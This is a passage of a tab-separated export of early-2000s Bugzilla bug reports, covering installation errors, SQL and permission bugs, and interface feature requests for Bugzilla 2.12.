/usr/lib/perl5/5.6.0/i386-linux /usr/lib/perl5/5.6.0  /usr/lib/perl5/site_perl/5.6.0/i386-linux /usr/lib/perl5/site_perl/5.6.0  /usr/lib/perl5/site_perl .) at RelationSet.pm line 38.         RelationSet::BEGIN() called at CGI/Carp.pm line 38         require 0 called at CGI/Carp.pm line 38         require RelationSet.pm called at ./processmail line 34         main::BEGIN() called at CGI/Carp.pm line 38         require 0 called at CGI/Carp.pm line 38 BEGIN failed--compilation aborted at RelationSet.pm line 38.         require RelationSet.pm called at ./processmail line 34         main::BEGIN() called at RelationSet.pm line 38         require 0 called at RelationSet.pm line 38 Compilation failed in require at RelationSet.pm line 34.         main::BEGIN() called at RelationSet.pm line 34         require 0 called at RelationSet.pm line 34 BEGIN failed--compilation aborted at ./processmail line 34. Reminder: Bugzilla now requires version 8.7 or later of sendmail.
79739%TAB%989395676%TAB%28615%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%contrib/bug_email.pl handling assigned_to incorrectly - breaks bugmail%TAB%contrib/bug_email.pl handling assigned_to incorrectly - breaks bugmailLooks like the the query to get the default owner is returning an ID and not the name of the owner.  (Noticed this upon upgrading from .10 to .12)  Change this: # Recode Names     $Control{'assigned_to'} = DBname_to_id($Control{'assigned_to'}, $forceAssignedOK);  to this:  # Recode Names if ($forceAssignedOK != 1) {     $Control{'assigned_to'} = DBname_to_id($Control{'assigned_to'}, $forceAssignedOK); }   Alternately, there's probably a change that could be made to DBbame_to_id to handle the second argument differently.  The real problem is that the initialowner and initialqacontact fields in the components table was changed from tinytext to mediumint in bug 66876 and the e-mail interface was never updated.
79816%TAB%989409557%TAB%4415%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%duplicates.cgi doesn't work with anything but db files.%TAB%duplicates.cgi doesn't work with anything but db files.on bugzilla.mozilla.org i've found and patched several problems with duplicates.cgi. the patched version is at  http://bugzilla.mozilla.org/duplicates.cgi the original version from cvs is at  http://bugzilla.mozilla.org/duplicates-orig.cgi   1) the report tries to open a db file so if your installation uses some other data format you're out of luck. I hard coded in ".dbi" for our installation but that's obviously not the best solution for everyone.  2) print today's date in the error message when you can't open a db.  3) don't print bugs that are verified or closed. If a bug is so recently fixed that its not verified yet then It seems likely that there are still people using a broken build that may want to file a duplicate bug.  4) when sorting by bug number, sort in reverse order. The first 100 low numbered bugs are of virtually no interest but high numbered bugs are quite interesting.
80037%TAB%989481978%TAB%5500%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Missing Appendix in Bugzilla 2.12%TAB%Missing Appendix in Bugzilla 2.12The following sentence is in the documentation:  It can be installed in the usual fashion after it has been fetched from CPAN where it is found as the Chart-x.x... tarball in a directory to be listed in Appendix "Required Software".  Where is the appendix?
80045%TAB%989483426%TAB%28145%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Query Page fails when email is non-existant and the matching is exact..%TAB%Query Page fails when email is non-existant and the matching is exact..Overview Description: In Bugzilla's (2.12) query page when an entry is made in  the text box called Email for a  user that does not exist and the matching is  made as "exact" bugzilla konks.  Steps to Reproduce: Go to the Query page, enter an invalid user/email  (like "hellothere") for the "Email" text box and then choose the matching pull- dowb option as "exact".  Actual Result: Should maybe come back with a clean error saying no such user.  Expected Result: Get the Internal server error. I can send the apache logs also  if needed.  Additional Information: I can look into this and see if I can get a patch out.  What's happening:   Bugzilla does a check to see if it can output the "Bugzilla is pondering your   Query" message (which only works w/Mozilla and Netscape).  If it can, it does   If it can't, it spits out an incomplete header (so it can push more info later   if it needs to).  Somewhere after doing that, it checks to see if the "exact"   e-mail address matches one in the database, if it doen't the scripts errors   out and exists (telling the user that the "exact" e-mail address isn't in the   database).  The problem is that the error routine expects that the header has   already been completely outputted (the blank line has already happened).  How this patch fix it:   Before spitting out the error (and only if the error is gonna be spit out) it   sends a blank line.  This will complete the header and makes everyone happy.   This blank line won't have any adverse effects elsewhere because it'll only   show up in the HTML source, not on the page itself.  While this isn't a security issue, per se, 500 errors are something to avoid and the fix is simple, so I'm marking it 2.14.
80169%TAB%989510786%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%[RFE] JavaScript-enhanced keyword editing,JavaScript-enhanced keyword editing%TAB%[RFE] JavaScript-enhanced keyword editing,JavaScript-enhanced keyword editingIt should be possible to use JavaScript to significantly improve the editing of the keywords field (while maintaining backwards compatibility for users without JavaScript).  Among other solutions to this problem, it is possible to use JavaScript to create two drop-down menus next to the keywords field.  The first menu contains a list of keywords currently in the field, while the second menu contains a list of all possible keywords.  When the user selects a keyword from the first ("remove") menu, that keyword is removed from the field.  When the user selects a keyword from the second ("add") menu, that keyword is added to the field.  When the user edits the keyword field manually, those edits are reflected in the "remove" menu, so that menu and the field are always in sync.  Future enhancements to this feature could include:  1. Displaying tool-tip descriptions of keywords as the user mouses over them in the menus or the field; 2. Preventing a user from manually typing in an invalid keyword or from entering a keyword twice (either manually or via the "add" menu); and  3. Reducing UI clutter by only having an "add" menu (since removing a keyword is arguably easy to accomplish manually, at least for those bugs whose list of keywords is not longer than the length of the field).  But these enhancements are icing on the cake.  Even without them this feature would make it significantly easier to edit the keywords field.
80183%TAB%989514203%TAB%18827%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%configurable index page [patch],configurable index page (using Template Toolkit)%TAB%configurable index page [patch],configurable index page (using Template Toolkit)This is an enhancement request (with patch providing the functionality) to add a new 'index.cgi' script that can replace or supplement the existing index.html static html file.  By having the main index page be a cgi program rather than static html, we can take advantage of the configuration params (like bannerhtml) which makes it far easier for sites to customize the HTML associated with their deployed version of Bugzilla.  I will attach to this bug two files: a new "index.cgi" file, and a patch to the defparams.pl file that adds a new "index-template" param that contains the html to be displayed on the index page.  In addition, the attached index.cgi file can (optionally) display a table of the products that are part of this Bugzilla instance.  If that table is shown, the product names can optionally be links to a query for all of the bugs for that product.  These optional features are turned off by default in order to emulate the original behavior of Bugzilla as closely as possible.  Although this is not even close to a solution for separating UI from application logic, it does help a bit by making it easier to upgrade Bugzilla without having to reimplement HTML changes in the index.html file.  A solution more along the lines of Bug 49225 in which XML is converted to HTML using a user-specified set of XSLT stylesheets would be preferable but more disruptive to implement.  See bug 2900 and bug 51100 for related issues.
80289%TAB%989568793%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%bug_form.pl should use checkboxes for groups instead of select list%TAB%bug_form.pl should use checkboxes for groups instead of select listHaving a long list of select boxes for group assignments of bugs is messy and  annoying to work with.  Having a set of checkboxes would make it much easier to  use.  Fixing this bug requires changes to two places: bug_form.pl needs to be changes to display the bugs differently. process_bug.cgi needs to change how it checks the group bits from the form.  I've made both of these changes on my dev instance, and will attach a diff  shortly.
80623%TAB%989760112%TAB%15368%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Reporting/Charting%TAB%Allow a param to duplicates.cgi to only list OPEN bugs%TAB%Allow a param to duplicates.cgi to only list OPEN bugsAllow a param to duplicates.cgi to only list OPEN bugs, I'm working on it...
81594%TAB%990139958%TAB%26861%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%SQL error after editing user entry in editusers.cgi%TAB%SQL error after editing user entry in editusers.cgiWhen modifying all three fields "Login name", "Real name" and "Disable Text" at  the same time, I get this SQL error message:   Updated user    Updated permissions. Updated real name. Content-type: text/html   Software error:  DELETE FROM logincookies WHERE userid=: You have an error in your SQL syntax  near '' at line 2 at globals.pl line 173.   Workaround is to do the required edit in two steps.
81642%TAB%990171470%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%"Split bug / Clone bug": Enter new bug with prefilled fields%TAB%"Split bug / Clone bug": Enter new bug with prefilled fieldsFor splitting bugs that contain multiple issues, a "Clone this bug" link in the "show_bug.cgi" generated bug view would be helpful.  It should have all fields initialized to the original one, except the comments. If you want to get fancy, you can have an intermediate page where you can choose to _not_ copy certain fields.  Maybe the description field should be initialized with something like "*** This bug has been split off bug 12345 ***".
82143%TAB%990518972%TAB%21302%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Reversing dependencies is difficult,Reversing dependencies causes "circular dependency chain" error%TAB%Reversing dependencies is difficult,Reversing dependencies causes "circular dependency chain" errorThis is probably in part a side-effect of the fix for bug 51670.  If I have two related bugs, and make bug 1 depend on bug 2, and then later  realise that I meant it the other way round (e.g. typed into the wrong field),  it is not possible to reverse the dependency in a single step.  Intuitively I would expect to be able to delete the '2' from the "depends on"  of bug 1, type '2' into the "blocks", and submit the form.  Bugzilla tells me that "The change you are making to dependencies has caused a  circular dependency chain.", when in fact it has not, but merely reversed the  direction of the existing chain.  In order to acheive the required operation, I have to first remove one  dependency and then add the other as a separate operation which makes it less  obvious what is happening in the bugmails.
82172%TAB%990524024%TAB%5490%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Bugzilla apparently allows deletion of summary,Don't allow empty bug summaries,Don't allow empty bug summaries%TAB%Bugzilla apparently allows deletion of summary,Don't allow empty bug summaries,Don't allow empty bug summariesBug 82118 had its summary deleted. Bugzilla should require the summary field to have data at all times.  I remember seeing a Mozilla bug very recently that form fields were getting  resubmitted in the wrong order.  I bet that was caused by the browser.  However,  yes, Bugzilla should be validating the data...
82497%TAB%990641495%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Stranded Params%TAB%Stranded ParamsIn the course of fixing bug 71552 it came up that when a Param is removed from defparam.pl it never gets removed from data/params.  While this shouldn't cause an problems, it is extra and unneeded stuff floating around.  There should be a routine in checksetup.pl that can remove those.  Right now the params the need removing are:  * newemailtech  * newemailtechdefault  * changedmail  * prettyasciimail  Attachment 33631 [details] has the routines that would need to be added to checksetup.pl.  There was a question on IRC how requiring defparams.pl would react w/out having globals.pl for the SendSQL routine (even though SendSQL is inside a sub that isn't called by WriteParams).
82561%TAB%990693693%TAB%29088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Interface%TAB%Displaying Bugs Id,Bug ID column should be align=right in buglist.cgi%TAB%Displaying Bugs Id,Bug ID column should be align=right in buglist.cgiSince bug ID is a decimal value, it aligning it to the right in the ID column  would increase 'readability'
82781%TAB%990791885%TAB%5189%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%describecomponents.cgi doesn't check viewing permissions%TAB%describecomponents.cgi doesn't check viewing permissionsI faced this one with my private installation of BugZilla 2.12 (see URL).  If you log in a user that isn't allowed to view all groups assinged to products, the products he has no permissions for are excluded in enter_bug.cgi as well as in query.cgi - but they still show up in describecomponents.cgi  I even can view all entries there if I'm not logged in as any user...
82809%TAB%990800563%TAB%22891%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Interface%TAB%bugzilla puts &#013; inside <pre> tags%TAB%bugzilla puts &#013; inside <pre> tagsI'm not sure if that's legal or not, but I do know that Konqueror can't cope  with it as well as mozilla can. Now I know most folks around here don't care  if another browser can handle the html we use or not, but when mozilla is  falling apart and you're trying to report that fact in bugzilla, you need  another browser to do it. Having line feeds encoded as html entities tends to  make pre blocks an unholy mess, especially if they contain things like stack  traces, or patches.
82878%TAB%990874499%TAB%29426%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%It would be cool if queries could produce RSS 1.0...%TAB%It would be cool if queries could produce RSS 1.0...so that people could put a bugzilla query in their RSS aggregator and keep an eye on bugs they're interested in...
83044%TAB%991051421%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Accounts%TAB%Can't view a confidential bug when not logged in,"Log In" in footer should return to same page after logging in.,Any page should be able to have ?GoAheadAndLogIn=1 in the URL to force a login.%TAB%Can't view a confidential bug when not logged in,"Log In" in footer should return to same page after logging in.,Any page should be able to have ?GoAheadAndLogIn=1 in the URL to force a login.Summary's a little funny-looking, but the real story won't fit there.  But here's  the scenario:  Steps to reproduce: 1) You receive bugmail for a change to a confidential bug. 2) You click the link in the bugmail from your email client 3) browser opens to the "This bug cannot be viewed unless you first log in" page. 4) click "log in" 5) fill out your username and password, then click Login  Actual results: - You are deposited on the Query page.  Expexted results: - You are shown the bug that you originally clicked the link to, or told that  your account doesn't have permission to view it.  This used to work.  I'm not sure when it broke.
83058%TAB%991068410%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%need a way to hide resolved bugs in dependency tree view%TAB%need a way to hide resolved bugs in dependency tree viewIn showdependencytree.cgi, resolved bugs are shown with a strikethough style. This makes sense if the dependency tree is reasonably small, but it is a big problem for huge dependency trees where almose all bugs are resolved.  There needs to be a way to view the dependency tree without all the subtrees that consist only of resolved bugs.
83152%TAB%991132623%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Administration%TAB%Better error when no initial owner entered.,Better (red) error when no initial owner entered.%TAB%Better error when no initial owner entered.,Better (red) error when no initial owner entered.Add component.  Leave initial owner blank.  Error:  The name is not a valid username. Either you misspelled it, or the person has not registered for a Bugzilla account.   Instead:  Should say the initial owner is not a valid username.  Also:  You get a different error message when you enter an invalid username for the owner and QA.  These should be cleaned up.
83474%TAB%991290864%TAB%29603%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%improper handling of "rebuildkeywordcache" in sanitycheck.cgi%TAB%improper handling of "rebuildkeywordcache" in sanitycheck.cgiWhen there is no keywords to correct in keywordache UNLOCK TABLES is not executed. After executing "sanitycheck.cgi?rebuildkeywordcache=1" I got error as quoted below.  I got this when I add and remove the first test keyword to bugzilla (after upgrade from bugzilla 2.8) without using it in any bug.  Proposed patch is attached to bug  PS. my MySQL version is "mysql  Ver 9.38 Distrib 3.22.32"  <---------------- cut> ....  Checking keywords table   Checking cached keywords   Sanity check completed.   Content-type: text/html   Software error:  SELECT profiles.userid, profiles.groupset, profiles.login_name, profiles.email, profiles.disabledtext FROM profiles WHERE login_name = 'Lukasz.Engel': Table 'profiles' was not locked with LOCK TABLES at globals.pl line 173.
83596%TAB%991327168%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%importxml.pl has dependency on XML::Parser not checked in checksetup.pl%TAB%importxml.pl has dependency on XML::Parser not checked in checksetup.pl
83618%TAB%991340937%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl won't compile if DBI is not installed%TAB%checksetup.pl won't compile if DBI is not installedTried to install Bugzilla on a local machine here that hasn't had database stuff  on it before, and got this as the *only* output when trying to run checksetup.pl:  Uncaught exception from user code:         Uncaught exception from user code:         Can't locate DBI.pm in @INC (@INC contains: /usr/lib/perl5/5.6.0/i386- linux /usr/lib/perl5/5.6.0 /usr/lib/perl5/site_perl/5.6.0/i386-linux /usr/lib/ perl5/site_perl/5.6.0 /usr/lib/perl5/site_perl .) at ./checksetup.pl line 560.         main::BEGIN() called at DBI.pm line 560         require 0 called at DBI.pm line 560 BEGIN failed--compilation aborted at ./checksetup.pl line 560.  There is a "use DBI" statement directly above the MySQL version checking code, at  the line number mentioned.  Commenting out that line solved the problem, since  DBI is already loaded at that point due to the version checking looking for it  earlier in the file.  With that line commented out, I got the usual version  checks, and the paragraph stating that I needed to install things like you  normally expect.  The version check for MySQL still succeeds (meaning DBI was  indeed loaded) after DBI is installed.  Patch is forthcoming.
83619%TAB%991341246%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%QuickSearch always crashes Netscape 4.76 & 4.77 on Unix%TAB%QuickSearch always crashes Netscape 4.76 & 4.77 on UnixThanks to Gerv for the report.  0. Lauch Netscape 4.76 or 4.77 on Unix 1. Go to http://bugzilla.mozilla.org 2. Type `foo' in the QuickSearch text box 3. Press return.  Result: Boom.  #0  0x08780296 in js_Atomize () #1  0x087998e3 in js_NewObject () #2  0x0879b3b8 in js_GetClassPrototype () #3  0x0879978a in js_NewObject () #4  0x0877f7a3 in js_NewArrayObject () #5  0x0877f479 in js_qsort () #6  0x0878b9db in js_Invoke () #7  0x0879146b in js_Interpret () #8  0x0878ba21 in js_Invoke () #9  0x0879146b in js_Interpret () #10 0x0878ba21 in js_Invoke () #11 0x0879146b in js_Interpret () ... #147 0x0879146b in js_Interpret () #148 0x0878ba21 in js_Invoke () #149 0x0878bbad in js_CallFunctionValue () #150 0x0877d7ea in JS_CallFunctionValue () #151 0x087bcee4 in lm_HandleEvent () #152 0x087bcc07 in lm_FindEventHandler () #153 0x087bcb34 in lm_SendEvent () #154 0x087b94be in form_submit () #155 0x087b9522 in lm_SendOnSubmit () #156 0x087b0cba in PR_ArenaFinish () #157 0x08932b56 in PR_HandleEvent () #158 0x087b2e2d in et_SubEventLoop () #159 0x087b2ecb in lm_wait_for_events () #160 0x0893d38c in HopToad () #161 0x0893d3cb in HopToadNoArgs () #162 0x0893d434 in PR_Start ()  We should add a browser sniffer and disable the QuickSearch functionality for these Netscape versions. Or, if someone knows how to work around this, let me know.  This is not a problem in mozilla, AFAIK. Also, Netscape 4.61 doesn't have this problem.
83633%TAB%991350955%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General,Bug Import/Export & Moving%TAB%importxml.pl warning: uninitialized value passed to use lib%TAB%importxml.pl warning: uninitialized value passed to use libAs reported by Tinderbox under Perl 5.6.0:  Running /usr/bin/perl -cw -I/home/dave/tinderbox/mozilla/webtools/bugzilla/ importxml.pl; Results: importxml.pl has compilable perl syntax. Warnings:  Use of uninitialized value in string eq at /usr/local/lib/perl5/5.6.0/lib.pm         line 19 (#1)          (W uninitialized) An undefined value was used as if it were already defined.   It was     interpreted as a "" or a 0, but maybe it was a mistake.  To suppress this     warning assign a defined value to your variables.      Empty compile time value given to use lib at /home/dave/tinderbox/mozilla/ webtools/bugzilla/importxml.pl line 52 Use of uninitialized value in -e at /usr/local/lib/perl5/5.6.0/lib.pm line 23  (#1) Use of uninitialized value in concatenation (.) at         /usr/local/lib/perl5/5.6.0/lib.pm line 35 (#1) Use of uninitialized value in concatenation (.) at         /usr/local/lib/perl5/5.6.0/lib.pm line 36 (#1) Use of uninitialized value in hash element at /usr/local/lib/perl5/5.6.0/lib.pm         line 40 (#1) Use of uninitialized value in require at         /home/dave/tinderbox/mozilla/webtools/bugzilla/importxml.pl line 54 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/site_perl/5.6.0/i586-linux/XML/Parser.pm line 12  (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/i586-linux/IO/File.pm line 110 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/i586-linux/IO/File.pm line 111 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/i586-linux/IO/File.pm line 112 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/i586-linux/IO/Seekable.pm line 51 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/i586-linux/IO/Handle.pm line 241 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/i586-linux/IO.pm line 5 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/i586-linux/IO/Seekable.pm line 54 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/i586-linux/IO/File.pm line 113 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/File/Spec.pm line 4 (#1) Use of uninitialized value in require at /usr/local/lib/perl5/5.6.0/vars.pm         line 11 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/warnings/register.pm line 3 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/File/Spec.pm line 14 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/File/Spec/Unix.pm line 5 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/site_perl/5.6.0/i586-linux/XML/Parser.pm line 15  (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/site_perl/5.6.0/i586-linux/XML/Parser/Expat.pm line  499 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/site_perl/5.6.0/i586-linux/XML/Parser/Expat.pm line  12 (#1) Use of uninitialized value in require at         /usr/local/lib/perl5/5.6.0/i586-linux/DynaLoader.pm line 20 (#1) Use of uninitialized value in string eq at         /usr/local/lib/perl5/5.6.0/File/Spec/Unix.pm line 57 (#1) Use of uninitialized value in concatenation (.) at         /usr/local/lib/perl5/5.6.0/i586-linux/DynaLoader.pm line 160 (#1) Use of uninitialized value in require at         /home/dave/tinderbox/mozilla/webtools/bugzilla/importxml.pl line 55 (#1) /home/dave/tinderbox/mozilla/webtools/bugzilla/importxml.pl syntax OK
83872%TAB%991512312%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla depends on DBD::mysql, not the Mysql module%TAB%Bugzilla depends on DBD::mysql, not the Mysql modulenowhere in any Bugzilla file is there any dependency on "Mysql" EXCEPT for the  version check for it in checksetup.pl.  The current version of Bugzilla uses DBI for everything, and as such, requires  DBD::mysql instead.  Recent installs with up-to-date versions of DBD::mysql have also started giving a  warning that $dbh->func("_ListTables") was deprecated, and should use  $dbh->tables instead.  Checking the changelogs on DBD::mysql, versions prior to  1.2209 had a broken $dbh->tables call that had a problem when the database was  empty (which is the case the first time checksetup.pl runs), so I'm nominating  version 1.2209 as the minimum version for the version checks.  The patch I'm about to attach removes the version check for Mysql, adds a check  for DBD::mysql 1.2209, and also changes the _ListTables routine to use  $dbh->tables.
84285%TAB%991789528%TAB%8667%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%enter_bug.cgi : asking user to pick from a list of 0 products%TAB%enter_bug.cgi : asking user to pick from a list of 0 productsProblem.  I setup Bugzilla 2.12. I turned on both usebuggroups and usebuggroupsentry. I created a product "ProdX". I created 10 users. I assigned 2 of these users to be members of the "ProdX" group. I clicked to enter a new bug. I logged in as one of the users who is NOT in the "ProdX" group. I got the Enter Bug screen saying "First, you must pick a product on which to  enter a bug" but there were no products listed. So I couldn't get any further.  Solution.  When the user is not permitted to enter bugs against any products, return a  sensible message rather than asking them to pick from a list with 0 elements.
84295%TAB%991798994%TAB%27556%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%error in userpref.cgi  (line 330) - attachemnts -%TAB%error in userpref.cgi  (line 330) - attachemnts -There seems to be an error in the latest version of the userpref.cgi. In line 104 is a 'emailVoterAttachemnts~'     . 'on~' . instead of               'emailVoterAttachments~'     . 'on~' .  The problem is a) an error when entering the userpref.cgi (undef value...)                b) the values of the emailflags in the profiles tables                   are corrupted.
84338%TAB%991820439%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%RFE: enhanced attachment and request tracking,RFE: enhanced attachment, patch and request tracking%TAB%RFE: enhanced attachment and request tracking,RFE: enhanced attachment, patch and request trackingI recently developed an enhancement to Bugzilla to enable users to edit information about attachments and flag them with statuses.  Attachment statuses show up in the attachment list when viewing a bug, and users can query for bugs with certain attachment statuses.  Other features of the tool include the ability to mark attachments invalid, causing their descriptions to appear with strike-through style when viewing a bug, and the ability to view all attachments on one page in a series of iframes.  I also created a second enhancement to Bugzilla to enable users to request changes to data in Bugzilla from other users (f.e. setting a status on an attachment).  Requests generate email to the requestee and go into a queue stored in a database table.  When the requestee makes the change specified in the request, the request is marked fulfilled in the database, and the requester is notified via email.  Users can also view the queue of pending requests to track them.  Both enhancements are implemented as a set of new files (module, script, templates) along with hooks into several existing Bugzilla scripts.  While both enhancements were developed to meet specific mozilla.org needs to track the patch review process, they both store their definitions (attachment statuses and request types) in database tables so they can be completely customized for other uses.  I set up a test Bugzilla installation and filed a bug with several patches to demonstrate the tools:  http://landfill.tequilarista.org/myk/bzpacman/show_bug.cgi?id=3  Create an account for yourself if you want to experiment in a more significant way.  http://landfill.tequilarista.org/myk/bzpacman/  I am writing technical documentation on the enhancements and will post it as it becomes available.
84596%TAB%991944775%TAB%29580%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%syncshadowdb doesn't specify user/pass for dump and restore%TAB%syncshadowdb doesn't specify user/pass for dump and restoreI attempted to set up a shadow database in bugzilla 2.12 (under Linux), and  while the results screen after submitting the parameter changes didn't give any  errors, it didn't work.  Bugzilla created the new database, but it was empty,  and every other bugzilla change gave an error at the bottom, as it tried to  modify a non-existant shadowdb table.  Tracked it down to the syncshadowdb program, which contains      system("mysqldump -l -e $db_name $tablelist > $tempfile");  to dump the DB, and then      open(MYSQL, "cat $tempfile | mysql $extra " .          Param("shadowdb") . "|") || die "Couldn't do db copy";  to restore into the shadowdb.  The problem seems to be that it's not passing a username/password to the mysql  apps, so the dump and import both get refused.  Once I hardcoded in the  appropriate user/pass for my db, shadowing started working.  Now I might just be doing something else wrong, since I couldn't find old or  current bugs about this problem, and I can't be the only one trying to use a  shadow, but we'll see... :)
84714%TAB%991986116%TAB%5500%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Can't change permissions from bug list%TAB%Can't change permissions from bug listCurrently, you can't change the group permissions under "Change several bugs at once".  We would like to make all open bugs public when we do a release of software since they are all in the release notes anyway.
85472%TAB%992339822%TAB%30381%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%I cant login to any Account,Logins are broken on systems that use MD5 for crypt()%TAB%I cant login to any Account,Logins are broken on systems that use MD5 for crypt()I installed on a new system bugzilla 2.12.   On this installation, I cant login to system (Masteraccount and normal accounts)  I only get the message "Login failed. The username or password you entered is  not valid. Please click Back and try again."  But username and password are valid!  I tried this with Netscape 4.x on unix and IE on Windows.  The same installation on another machine is running.
85734%TAB%992428109%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%new bug notification shouldn't include blank fields%TAB%new bug notification shouldn't include blank fieldsI just noticed this when the CC: field was added, but this applies to all  fields.  it's a waste of bytes, and reading time to include blank fields. so let's fix  the mailer to stop doing it.
85832%TAB%992455541%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%quicksearch should strip spaces before sending to show_bug.cgi%TAB%quicksearch should strip spaces before sending to show_bug.cgiIf QuickSearch is just given a number and some spaces, it sends the user to show_bug.cgi.  That's good, but it sends the spaces to show_bug.cgi too, which means that next time I see the bug on a bug list, it won't appear as a visited link.  Also, bugzilla currently rejects bug URLs with spaces (I think this is temporary).
85833%TAB%992455602%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%show_bug.cgi doesn't accept space after bug number%TAB%show_bug.cgi doesn't accept space after bug numberBugzilla's show_bug.cgi rejects URLs that have a space after the bug number, saying that the bug number is invalid.  I think this is a recent regression.  This is particularly annoying because I often double-click a bug number (which selects the space after the number), paste it into a QuickSearch form, and press enter.  (QuickSearch not stripping the space causes problems even without show_bug.cgi rejecting the URL, so I filed bug 85832 on QuickSearch.)
86001%TAB%992529594%TAB%8593%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla: Other moz.org Issues,Bugzilla Helper,Bugzilla-General%TAB%"Description" box is too damn small%TAB%"Description" box is too damn smallThe "Description" box has only four visible lines. The actual/expected results/steps to reproduce boxes have six, and the "aditional info" has nine.  I think the "Description" box should be larger. Four visible lines is way too few when you are trying to articulate an argument (like a complex feature request). Also, it's the most important part of the bug when the behavior can't be reproduced (again, feature requests), and even when it can be reproduced, to explain why it's wrong. This paragraph has six lines, and would be harder to type in that small four-line box.  It should have 11 lines like the "Description" box in http://bugzilla.mozilla.org/enter_bug.cgi?product=mozilla.org  (And yeah, the page source says rows=3. Why it has four lines and not three, I don't know.)
86029%TAB%992546778%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%create permission restrictions for createaccount.cgi,create permission restrictions for createaccount.cgi (prevent people from creating accounts)%TAB%create permission restrictions for createaccount.cgi,create permission restrictions for createaccount.cgi (prevent people from creating accounts)How can I administer such that only the adminstrator can create user login accounts ? Vanilla bugzilla allows anyone to create a login account.  The following possibilities should probably exist: a. allow account creation based on email request b. allow account creation by guests who are not logged in c. allow account creation by people who are logged in and have some privelege  while enabling b doesn't make much sense, it might not unreasonable to  discourage people from creating multiple accounts.  c is probably what most people want. a is probably worthy of it's own bug.  The specific privelege for C is probably the most interesting question, should  it be something you can control by adding people to a group, or like a checkbox  in edit users, or ...
